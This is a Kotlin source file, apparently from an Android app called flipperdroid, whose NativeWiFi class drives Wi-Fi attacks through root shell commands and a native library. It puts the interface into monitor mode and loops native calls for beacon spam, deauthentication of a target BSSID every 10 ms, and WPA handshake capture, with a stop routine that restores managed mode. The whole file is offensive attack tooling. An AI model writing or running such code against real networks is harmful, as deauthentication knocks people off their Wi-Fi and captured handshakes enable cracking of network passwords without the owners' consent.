package com.flipperdroid.modules.wifi

import com.flipperdroid.modules.root.RootShell

class NativeWiFi {

    private var attackThread: Thread? = null
    private var isRunning = false

    init {
        System.loadLibrary("native_wifi")
    }

    private external fun nativeBeaconSpam(ssid: String): Boolean
    private external fun nativeDeauth(bssid: String): Boolean
    private external fun nativeCaptureHandshake(interfaceName: String): String
    private external fun nativeStopAttack(): Boolean

    fun startBeaconSpam(ssid: String): Boolean {
        isRunning = true
        return try {
            // Switch to monitor mode via root
            RootShell.execute("ifconfig wlan0 down")
            RootShell.execute("iw dev wlan0 set monitor none")
            RootShell.execute("ifconfig wlan0 up")

            // Start beacon spam in a thread
            attackThread = Thread {
                while (isRunning) {
                    nativeBeaconSpam(ssid)
                    Thread.sleep(100)
                }
            }
            attackThread?.start()
            true
        } catch (e: Exception) {
            false
        }
    }

    fun startDeauthAttack(bssid: String): Boolean {
        isRunning = true
        return try {
            RootShell.execute("ifconfig wlan0 down")
            RootShell.execute("iw dev wlan0 set monitor none")
            RootShell.execute("ifconfig wlan0 up")

            attackThread = Thread {
                while (isRunning) {
                    nativeDeauth(bssid)
                    Thread.sleep(10)
                }
            }
            attackThread?.start()
            true
        } catch (e: Exception) {
            false
        }
    }

    fun captureHandshake(interfaceName: String): String {
        return try {
            RootShell.execute("ifconfig $interfaceName down")
            RootShell.execute("iw dev $interfaceName set monitor none")
            RootShell.execute("ifconfig $interfaceName up")

            val result = nativeCaptureHandshake(interfaceName)
            RootShell.execute("ifconfig $interfaceName down")
            RootShell.execute("iw dev $interfaceName set type managed")
            RootShell.execute("ifconfig $interfaceName up")
            result
        } catch (e: Exception) {
            "❌ Ошибка захвата: ${e.message}"
        }
    }

    fun stopAttack() {
        isRunning = false
        attackThread?.interrupt()
        attackThread = null
        try {
            nativeStopAttack()
            RootShell.execute("ifconfig wlan0 down")
            RootShell.execute("iw dev wlan0 set type managed")
            RootShell.execute("ifconfig wlan0 up")
        } catch (e: Exception) {
            // ignore
        }
    }
}